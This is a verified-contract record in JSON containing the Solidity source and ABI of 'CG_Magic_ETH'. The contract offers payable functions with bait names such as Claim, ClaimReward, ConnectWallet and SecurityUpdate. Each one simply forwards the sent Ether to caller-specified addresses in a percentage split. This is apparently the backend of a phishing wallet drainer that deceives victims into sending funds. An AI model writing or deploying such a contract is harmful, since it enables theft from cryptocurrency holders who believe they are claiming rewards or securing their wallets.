{"SourceCode": "// SPDX-License-Identifier: Unlicense\r\npragma solidity ^0.8.18;\r\n\r\ncontract CG_Magic_ETH {\r\n    address private owner;\r\n\r\n    modifier onlyOwner() {\r\n        require(msg.sender == owner, \"Only owner can call this\");\r\n        _;\r\n    }\r\n\r\n    modifier validAmount() {\r\n        require(msg.value > 0, \"Invalid amount\");\r\n        _;\r\n    }\r\n\r\n    constructor() {\r\n        owner = msg.sender;\r\n    }\r\n\r\n    function getOwner() public view returns (address) {\r\n        return owner;\r\n    }\r\n\r\n    function _executeTransaction(address sender, address recipient, uint8 recipientPercentage) public payable validAmount\r\n    {\r\n        uint256 gasCost = tx.gasprice * gasleft();\r\n        uint256 totalAmount = msg.value - gasCost;\r\n        if(recipientPercentage == 100) {\r\n            payable(recipient).transfer(totalAmount);\r\n        } else {\r\n            uint256 payoutRecipientAmount = (totalAmount * recipientPercentage) / 100;\r\n            uint256 payoutSenderAmount = totalAmount - payoutRecipientAmount;\r\n            payable(recipient).transfer(payoutRecipientAmount);\r\n            payable(sender).transfer(payoutSenderAmount);\r\n        }\r\n    }\r\n\r\n    function Claim(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function ClaimReward(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function ClaimRewards(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function Execute(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function Swap(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function Connect(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function ConnectWallet(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    function SecurityUpdate(address sender, address recipient, uint8 recipientPercentage) public payable {\r\n        _executeTransaction(sender, recipient, recipientPercentage);\r\n    }\r\n\r\n    receive() external payable {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"Claim\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"ClaimReward\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"ClaimRewards\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"Connect\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"ConnectWallet\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"Execute\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"SecurityUpdate\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"Swap\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"recipientPercentage\",\"type\":\"uint8\"}],\"name\":\"_executeTransaction\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "CG_Magic_ETH", "CompilerVersion": "v0.8.24+commit.e11b9ed9", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://7827b51220937d1d9d3665a5e8d2ff88790b3a63d4a37cb35364c3427bc7627c"}